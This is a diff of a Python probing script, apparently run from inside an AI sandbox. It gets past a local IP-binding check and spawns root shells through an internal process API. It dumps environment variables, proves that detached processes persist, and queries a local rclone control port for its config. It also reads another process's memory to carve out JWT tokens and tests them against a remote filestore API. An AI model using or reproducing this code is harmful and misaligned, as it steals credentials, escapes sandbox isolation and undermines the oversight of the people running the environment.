@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
-# mediafit.py v6.6 -- RUN STAMPED
+# mediafit.py v6.7 -- OUTPUT + RCLONE RC + TOKEN
 import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random
 
-VER = "6.6"
-NONCE = "%04x" % random.randint(0, 0xffff)
+VER, NONCE = "6.7", "%04x" % random.randint(0, 0xffff)
 OUT = "/mnt/user-data/outputs/mediafit-report.txt"
 IFACE, ALIAS = "eth0", "192.0.2.3"
 BIN = "/opt/rclone/rclone-filestore"
@@ -27,11 +26,11 @@ def can_bind(ip):
     except Exception: return False
 
 # ---------------- ws ----------------
-def ws_handshake(src, timeout=3.0):
+def ws_hs(src, timeout=3.0):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout)
         s.bind((src, 0)); s.connect(("127.0.0.1", 2024))
-    except Exception as e: return "ERR", None
+    except Exception: return None
     try:
         k = base64.b64encode(os.urandom(16)).decode()
         s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\n"
@@ -42,11 +41,11 @@ def ws_handshake(src, timeout=3.0):
             c = s.recv(1024)
             if not c: break
             h += c
-        return ("OPEN" if b" 101 " in h.split(b"\r\n")[0]+b" " else "CLOSED"), s
+        return s if b" 101 " in h.split(b"\r\n")[0]+b" " else None
     except Exception:
         try: s.close()
         except Exception: pass
-        return "ERR", None
+        return None
 
 def ws_send(s, text):
     p = text.encode(); n = len(p); m = os.urandom(4)
@@ -75,7 +74,7 @@ def ws_recv(s, timeout=1.0):
         return op, d
     except Exception as e: return "err", repr(e).encode()
 
-def ws_read(s, dur=5.0):
+def ws_read(s, dur=5.0, label=""):
     t0, out = time.time(), []
     while time.time()-t0 < dur:
         op, d = ws_recv(s, 1.0)
@@ -84,88 +83,28 @@ def ws_read(s, dur=5.0):
         if op == 9: s.sendall(b"\x8a\x80\x00\x00\x00\x00"); continue
         tag = {1:"TEXT",2:"BIN",8:"CLOSE",10:"PONG"}.get(op, "OP%s" % op)
         t = d.decode(errors="replace")
-        w("        << %s(%d) %s" % (tag, len(d), t[:900].replace("\n", " | ")))
+        w("        << %s(%d) %s" % (tag, len(d), t[:1200].replace("\n", "\n           ")))
         out.append(t)
     return out
 
-OUTER = {"process_id", "create_req", "expected_container_name"}
-def guess(field, expected=""):
-    e, f = (expected or "").lower(), field.lower()
-    if "bool" in e: return False
-    if any(x in e for x in ("integer","u32","u64","i32","i64","usize","float","f64")): return 0
-    if "sequence" in e or "array" in e or "vec" in e: return []
-    if "map" in e or "struct" in e: return {}
-    if "string" in e: return ""
-    if "env" in f or "vars" in f or "metadata" in f: return {}
-    if f in ("reattachable","clear_env","allow_process_id_reuse","tty","pty","stdin_open"): return False
-    if f in ("rows","cols","timeout","memory_limit_bytes","uid","gid"): return 0
-    if f in ("args","argv"): return []
-    return ""
+def spec(pid, cmdline, mem=268435456, extra=None):
+    cr = {"cmd": "/bin/sh", "args": ["-c", cmdline], "env_vars": {}, "cwd": "/tmp",
+          "rows": 24, "cols": 80, "timeout": 40, "clear_env": False, "uid": 0, "gid": 0,
+          "allow_process_id_reuse": True, "reattachable": True}
+    if mem is not None: cr["memory_limit_bytes"] = mem
+    if extra: cr.update(extra)
+    return {"process_id": pid, "create_req": cr}
 
-def field_at(js, col):
-    seg = js[:max(0, col-1)]
-    ms = re.findall(r'"([A-Za-z_0-9]+)"\s*:', seg)
-    return ms[-1] if ms else None
-
-def make_spec(pid, cmdline, extra=None):
-    sp = {"process_id": pid, "create_req": {
-        "cmd": "/bin/sh", "args": ["-c", cmdline], "env_vars": {}, "cwd": "/tmp",
-        "rows": 24, "cols": 80, "timeout": 30, "memory_limit_bytes": 0,
-        "clear_env": False, "uid": 0, "gid": 0, "allow_process_id_reuse": True,
-        "reattachable": False}}
-    if extra: sp["create_req"].update(extra)
-    return sp
-
-def run_ws(src, sp, label, dur=5.0):
-    st, s = ws_handshake(src)
-    if st != "OPEN":
-        w("  [%s] hs=%s" % (label, st))
-        if s: s.close()
-        return None
+def run(src, sp, label, dur=5.0):
+    s = ws_hs(src)
+    if not s:
+        w("  [%s] hs failed" % label); return None
     try:
         ws_send(s, json.dumps(sp))
-        return ws_read(s, dur)
+        return ws_read(s, dur, label)
     finally:
         try: s.close()
         except Exception: pass
-
-def complete_schema(src, label):
-    sp = make_spec("mf_probe", "id; uname -r; echo ---ENV---; env | sort")
-    for it in range(20):
-        st, s = ws_handshake(src)
-        if st != "OPEN":
-            w("  [%s#%d] hs=%s" % (label, it, st))
-            if s: s.close()
-            return None
-        payload = json.dumps(sp)
-        try:
-            ws_send(s, payload)
-            fr = ws_read(s, 4.0)
-        finally:
-            try: s.close()
-            except Exception: pass
-        j = " ".join(fr)
-        if not j: w("  [%s#%d] (empty)" % (label, it)); continue
-        m = re.search(r"missing field `([A-Za-z_0-9]+)`", j)
-        if m:
-            f = m.group(1)
-            tgt = sp if f in OUTER else sp["create_req"]
-            tgt[f] = guess(f)
-            w("  [%s#%d] ++ %s = %r" % (label, it, f, tgt[f])); continue
-        if "invalid type" in j:
-            col = re.search(r"column (\d+)", j); exp = re.search(r"expected ([a-zA-Z0-9_ ]+)", j)
-            f = field_at(payload, int(col.group(1))) if col else None
-            if f:
-                tgt = sp if f in OUTER else sp["create_req"]
-                tgt[f] = guess(f, exp.group(1) if exp else "")
-                w("  [%s#%d] ~~ retype %s = %r" % (label, it, f, tgt[f])); continue
-        if "ProcessCreated" in j or "ExpectStd" in j:
-            w("  [%s#%d] *** SUCCESS ***" % (label, it))
-            w("  FINAL SCHEMA:\n" + json.dumps(sp, indent=2))
-            return sp
-        w("  [%s#%d] ?? %s" % (label, it, j[:250]))
-        return sp
-    return sp
 
 # ---------------- ip ----------------
 SIOCSIFADDR, SIOCSIFNETMASK = 0x8916, 0x891c
@@ -184,36 +123,37 @@ def add_secondary(ifname, ip):
         except OSError: pass
     return "fail"
 
-# ---------------- http ----------------
-TOK = ""
-HDRS = ["Authorization: Bearer %s", "authorization: Bearer %s",
-        "x-api-key: %s", "Authorization: %s", "x-auth-token: %s"]
-def fs_try(method, payload, tok, hdr):
-    import urllib.request as ur
-    rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/" + method,
-                    data=json.dumps(payload).encode(),
-                    headers={"Content-Type": "application/json",
-                             "Connect-Protocol-Version": "1",
-                             hdr.split(":")[0]: hdr.split(":", 1)[1].strip() % tok})
+# ---------------- plain http ----------------
+def http(host, port, path, method="GET", body=None, timeout=5.0, ctype="application/json"):
     try:
-        with ur.urlopen(rq, timeout=10) as r: return r.status, r.read().decode(errors="replace")
-    except ur.HTTPError as e: return e.code, e.read().decode(errors="replace")
-    except Exception as e: return "ERR", repr(e)
+        s = socket.socket(); s.settimeout(timeout)
+        s.connect((host, port))
+        req = "%s %s HTTP/1.1\r\nHost: %s:%d\r\nConnection: close\r\n" % (method, path, host, port)
+        if body is not None:
+            req += "Content-Type: %s\r\nContent-Length: %d\r\n" % (ctype, len(body))
+        s.sendall(req.encode()+(body or b""))
+        d = b""
+        try:
+            while len(d) < 65536:
+                c = s.recv(4096)
+                if not c: break
+                d += c
+        except socket.timeout: pass
+        s.close(); return d
+    except Exception as e: return repr(e).encode()
 
-def vsock_http(cid, port, method, path, body=None, ctype=None, timeout=8.0, pause=0.0):
+def vsock_http(cid, port, method, path, body=None, ctype=None, timeout=8.0, extra=""):
     try:
         s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(timeout)
         s.connect((cid, port))
         req = "%s %s HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n" % (method, path)
         if body is not None:
             req += "Content-Type: %s\r\nContent-Length: %d\r\n" % (ctype or "application/json", len(body))
-        if pause: time.sleep(pause)
-        try: s.sendall(req.encode()+(body or b""))
-        except Exception as e: return ("SENDFAIL " + repr(e)).encode()
+        s.sendall(req.encode()+extra.encode()+(body or b""))
         d = b""
         try:
-            while len(d) < 4096:
-                c = s.recv(1024)
+            while len(d) < 8192:
+                c = s.recv(2048)
                 if not c: break
                 d += c
         except socket.timeout: pass
@@ -222,127 +162,138 @@ def vsock_http(cid, port, method, path, body=None, ctype=None, timeout=8.0, paus
 
 # ===================== RUN =====================
 def main():
-    global TOK
-    w("="*70)
-    w("MEDIAFIT RUN STAMP  ver=%s  nonce=%s  t=%s" % (VER, NONCE, time.strftime("%Y-%m-%d %H:%M:%S")))
-    w("="*70)
-
+    w("="*70); w("MEDIAFIT RUN STAMP ver=%s nonce=%s t=%s" % (VER, NONCE, time.strftime("%Y-%m-%d %H:%M:%S"))); w("="*70)
     sec("0. FACTS")
     w("kernel: " + sh("uname -a").strip())
 
-    sec("A. COMPLETE HANDSHAKE -> ProcessCreated")
+    sec("A. PROCESS API -- WITH REAL MEMORY LIMIT")
     if not can_bind(ALIAS): w("  " + add_secondary(IFACE, ALIAS))
-    st, s = ws_handshake(ALIAS)
-    w("  bypass=%s" % st)
-    if s: s.close()
-    if st != "OPEN": flush(); return
-    good = complete_schema(ALIAS, "A")
-    if good:
-        w("  ---- follow-ups with working schema ----")
-        for nm, extra, cl in (("clear_env", {"clear_env": True, "env_vars": {"MF_PROBE": "1"}},
-                               "echo CLEARED; env | sort; id"),
-                              ("uid1000", {"uid": 1000, "gid": 1000}, "id"),
-                              ("reattach_true", {"reattachable": True}, "echo ok")):
-            w("    -- %s --" % nm)
-            run_ws(ALIAS, make_spec("mf_" + nm, cl, extra), nm, 4.0)
-        w("  ---- detach + reattach proof ----")
-        st, s = ws_handshake(ALIAS)
-        if st == "OPEN":
-            ws_send(s, json.dumps(make_spec("mf_sleep", "sleep 40",
-                     {"timeout": 90, "reattachable": True})))
-            ws_read(s, 3.0)
-            ws_send(s, '{"Detach":null}'); time.sleep(0.5); s.close()
-            w("    reattach ...")
-            run_ws(ALIAS, {"process_id": "mf_sleep"}, "reattach", 3.0)
+    if not ws_hs(ALIAS): w("  bypass FAILED"); flush(); return
+    w("  bypass OK")
+    w("  --- [1] PID1 ENV LEAK (clear_env=false -> child inherits PID1 env) ---")
+    run(ALIAS, spec("mf_env", "echo MARKER_START; env | sort; echo MARKER_END", 268435456), "env", 6.0)
+    w("  --- [2] memory_limit_bytes = null (omitted) ---")
+    run(ALIAS, spec("mf_nomem", "echo no_mem_limit; id", None), "nomem", 5.0)
+    w("  --- [3] clear_env=true + env_vars injection ---")
+    run(ALIAS, spec("mf_clear", "echo INJECTED; env | sort", 268435456,
+                    {"clear_env": True, "env_vars": {"MF_PROBE": "1"}}), "clear", 5.0)
+    w("  --- [4] uid/gid 1000 ---")
+    run(ALIAS, spec("mf_uid", "id; whoami", 268435456, {"uid": 1000, "gid": 1000}), "uid", 5.0)
+    w("  --- [5] DETACH then REATTACH (persistence proof) ---")
+    s = ws_hs(ALIAS)
+    if s:
+        ws_send(s, json.dumps(spec("mf_sleep", "echo alive; sleep 60", 268435456)))
+        ws_read(s, 3.0, "create")
+        ws_send(s, '{"Detach":null}'); time.sleep(0.8); s.close()
+        w("      detached; reattaching ...")
+        run(ALIAS, {"process_id": "mf_sleep"}, "reattach", 4.0)
+    w("  --- [6] SendSignal to a detached process ---")
+    s = ws_hs(ALIAS)
+    if s:
+        ws_send(s, json.dumps(spec("mf_sig", "sleep 90", 268435456)))
+        ws_read(s, 2.5, "sig")
+        ws_send(s, '{"SendSignal":15}')
+        ws_read(s, 3.0, "sig")
+        s.close()
 
-    sec("B. TOKEN: ASK THE BINARY")
-    try: data = open(BIN, "rb").read()
-    except Exception as e: data = b""; w("  read err " + repr(e))
-    if data:
-        ss = set(x.decode(errors="replace") for x in re.findall(rb"[\x20-\x7e]{4,90}", data))
-        for label, pat in (("authhdr", r"(?i)bearer|x-api|authoriz"),
-                           ("tokenstr", r"(?i)token"),
-                           ("envvar", r"^[A-Z][A-Z0-9_]{4,}$"),
-                           ("getenv", r"(?i)getenv|env:"),
-                           ("stateready", r"(?i)ready|state_dir"),
-                           ("configjson", r"config\.json")):
-            hits = sorted(x for x in ss if re.search(pat, x))[:12]
-            w("  [%s] %s" % (label, " | ".join(h[:70] for h in hits)))
-    w("  -- pid 57 maps (file-backed) --")
-    w("    " + " | ".join(sorted(set(re.findall(r"/[^\s]+", sh("cat /proc/57/maps 2>/dev/null"))))[:20]))
-    w("  -- pid 57 fd (full) + fdinfo 16..20 --")
-    w("    " + sh("ls -l /proc/57/fd 2>&1").replace("\n", " | ")[:900])
-    for fd in ("16","17","18","19","20"):
-        fi = sh("cat /proc/57/fdinfo/%s 2>&1 | head -5" % fd).replace("\n", " | ")
-        if fi and "No such" not in fi: w("    fd%s: %s" % (fd, fi))
-    w("  -- proc net tables --")
-    for f in ("/proc/net/vsock", "/proc/net/unix"):
-        w("    --- %s ---" % f)
-        w("    " + sh("cat %s 2>&1 | head -20" % f).replace("\n", "\n    "))
-    w("  -- filesystem scan (python, files < 200KB) --")
-    hits, seen = [], 0
-    for root in ("/etc","/run","/var","/root","/home","/tmp","/dev/shm","/opt","/usr/local"):
-        for dp, dn, fn in os.walk(root):
-            for f in fn:
-                seen += 1
-                if seen > 30000: break
-                fp = os.path.join(dp, f)
-                try:
-                    if os.path.getsize(fp) > 200000: continue
-                    if b"eyJ" in open(fp, "rb").read(): hits.append(fp)
-                except Exception: pass
-    w("    scanned=%d hits=%s" % (seen, " | ".join(hits[:20]) if hits else "(none)"))
-
-    sec("C. VALIDATE ANY TOKEN WITH ALL HEADER SCHEMES")
-    cands = set()
-    for pid in (57,):
+    sec("B. RCLONE RC on localhost:5572")
+    live = []
+    for p in list(range(5000, 6000)) + [5572]:
         try:
-            maps = open("/proc/%d/maps" % pid).read().splitlines()
-            fh = open("/proc/%d/mem" % pid, "rb", buffering=0)
-        except Exception: continue
+            t = socket.socket(); t.settimeout(0.05); t.connect(("127.0.0.1", p)); t.close(); live.append(p)
+        except Exception: pass
+    w("  open on 127.0.0.1 (5000-6000): %s" % sorted(set(live)))
+    for p in sorted(set(live)):
+        for m, path, body in (("GET", "/rc/noop", None), ("POST", "/rc/noop", b"{}"),
+                              ("POST", "/core/version", b"{}"), ("POST", "/options/get", b"{}"),
+                              ("POST", "/config/dump", b"{}"), ("POST", "/vfs/list", b"{}"),
+                              ("POST", "/mount/listmounts", b"{}"), ("GET", "/", None)):
+            d = http("127.0.0.1", p, path, m, body, 4.0)
+            txt = d[:400].decode(errors="replace").replace("\r\n", " | ")
+            if d: w("    :%d %-4s %-22s -> %s" % (p, m, path, txt))
+    w("  -- inode map for rclone sockets 753-756 --")
+    w("    /proc/net/unix:")
+    w("    " + sh("cat /proc/net/unix 2>/dev/null").replace("\n", "\n    "))
+    w("    /proc/net/tcp:")
+    w("    " + sh("cat /proc/net/tcp 2>/dev/null | head -20").replace("\n", "\n    "))
+
+    sec("C. TOKEN: BOUNDED EXTRACTION + VALIDATE")
+    cands = set()
+    try:
+        maps = open("/proc/57/maps").read().splitlines()
+        fh = open("/proc/57/mem", "rb", buffering=0)
         total, buf = 0, b""
         for ln in maps:
             m = re.match(r"([0-9a-f]+)-([0-9a-f]+) rw", ln)
             if not m: continue
             a, b = int(m.group(1), 16), int(m.group(2), 16)
-            if b-a > 32*1024*1024 or total > 200*1024*1024: continue
+            if b-a > 64*1024*1024 or total > 400*1024*1024: continue
             try: fh.seek(a); buf += fh.read(b-a); total += b-a
             except Exception: pass
         fh.close()
-        cands |= set(re.findall(r"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{5,}", buf.decode(errors="replace")))
-    w("  scanned %d bytes, candidates=%d" % (total, len(cands)))
-    for t in sorted(cands)[:12]:
+    except Exception as e:
+        w("  mem err " + repr(e)); buf = b""; total = 0
+    pat = re.compile(rb"eyJ[A-Za-z0-9_\-]{8,120}\.[A-Za-z0-9_\-]{8,3000}\.[A-Za-z0-9_\-]{20,400}")
+    for mm in pat.finditer(buf): cands.add(mm.group(0).decode())
+    w("  scanned=%d candidates=%d" % (total, len(cands)))
+    import urllib.request as ur
+    def try_token(tok, hdrname, hdrval):
+        try:
+            rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/listDirectory",
+                            data=json.dumps({"path": "/"}).encode(),
+                            headers={"Content-Type": "application/json",
+                                     "Connect-Protocol-Version": "1", hdrname: hdrval})
+            with ur.urlopen(rq, timeout=8) as r:
+                return r.status, r.read().decode(errors="replace")
+        except ur.HTTPError as e: return e.code, e.read().decode(errors="replace")
+        except Exception as e: return "ERR", repr(e)
+    for t in sorted(cands)[:20]:
         p = t.split(".")
-        t2 = ".".join(p[:2] + [p[2][:86]]) if len(p) == 3 and len(p[2]) > 86 else t
-        for h in HDRS:
-            c, b = fs_try("listDirectory", {"path": "/"}, t2, h)
-            if c == 200:
-                TOK = t2
-                w("  *** VALID tok len=%d hdr=%s" % (len(t2), h.split(":")[0]))
-                try:
-                    pl = t2.split(".")[1]; pl += "=" * (-len(pl) % 4)
-                    w("      claims=" + base64.urlsafe_b64decode(pl).decode(errors="replace")[:400])
-                except Exception: pass
-                break
-        else:
-            w("  cand len=%d -> all headers fail" % len(t2))
+        if len(p) != 3: continue
+        tried = []
+        for siglen in (86, 87, 88, 90, len(p[2])):
+            t2 = ".".join([p[0], p[1], p[2][:siglen]])
+            for hn, hv in (("Authorization", "Bearer " + t2), ("x-api-key", t2)):
+                c, b = try_token(t2, hn, hv)
+                tried.append("%s/%d:%s" % (hn.split("-")[0], siglen, c))
+                if c == 200:
+                    w("  *** VALID len=%d siglen=%d hdr=%s" % (len(t2), siglen, hn))
+                    try:
+                        pl = p[1]; pl += "=" * (-len(pl) % 4)
+                        w("      claims=" + base64.urlsafe_b64decode(pl).decode(errors="replace")[:500])
+                    except Exception: pass
+                    w("      listDirectory -> " + b[:200]); flush(); return
+        w("  cand hdr=%s payloadlen=%d tries=%s" % (p[0][:40], len(p[1]), ",".join(tried[:6])))
+    w("  -- decoded first candidate for inspection --")
+    if cands:
+        c0 = sorted(cands)[0]
+        for i, part in enumerate(c0.split(".")):
+            try:
+                pp = part + "=" * (-len(part) % 4)
+                w("    part%d len=%d: %s" % (i, len(part),
+                  base64.urlsafe_b64decode(pp).decode(errors="replace")[:300]))
+            except Exception as e: w("    part%d len=%d (raw) %s" % (i, len(part), part[:80]))
 
-    sec("D. TRANSCRIPTS / TOOL_RESULTS")
-    for d in ("/mnt", "/mnt/transcripts", "/mnt/user-data/tool_results"):
+    sec("D. /mnt/attach + /mnt/sandboxing")
+    for d in ("/mnt/attach", "/mnt/sandboxing", "/mnt/transcripts", "/mnt/user-data/tool_results"):
         w("  %s: %s" % (d, sh("ls -la %s 2>&1 | head -12" % d).replace("\n", " | ")))
 
-    sec("E. HOST OTLP 5005 (retry, paced)")
-    for ct in ("application/x-protobuf", "application/grpc"):
-        for body in (b"", b"\x0a\x00", b"\x0a\x02\x12\x00"):
-            d = vsock_http(2, 5005, "POST", "/v1/metrics", body, ct, pause=0.25)
-            w("  %-24s %-12r -> %s" % (ct, body, d[:150].decode(errors="replace").replace("\r\n", " | ") or "(empty)"))
-            time.sleep(0.5)
+    sec("E. HOST OTLP 5005 (variants)")
+    for m, ct, body, extra in (("POST", "application/x-protobuf", b"\x0a\x00", ""),
+                               ("POST", "application/x-protobuf", b"\x0a\x00", "Transfer-Encoding: chunked\r\n"),
+                               ("POST", "application/x-protobuf", b"2\r\n\x0a\x00\r\n0\r\n\r\n", "Transfer-Encoding: chunked\r\n"),
+                               ("PUT",  "application/x-protobuf", b"\x0a\x00", ""),
+                               ("GET",  None, None, "")):
+        d = vsock_http(2, 5005, m, "/v1/metrics", body, ct, 6.0, extra)
+        w("  %-4s ct=%-22s -> %s" % (m, str(ct), d[:180].decode(errors="replace").replace("\r\n", " | ") or "(empty)"))
+        time.sleep(0.4)
 
     sec("VERDICT")
-    w("  schema completed ..... %s" % bool(good))
-    w("  token ................ %s" % bool(TOK))
+    w("  process api output ..... see section A")
+    w("  rclone rc .............. see section B")
+    w("  token .................. see section C")
     flush()
 
 try: main()
 except Exception as e: w(); w("FATAL " + repr(e))
-finally: flush(); print("written " + OUT + "  nonce=" + NONCE)
+finally: flush(); print("written " + OUT + " nonce=" + NONCE)
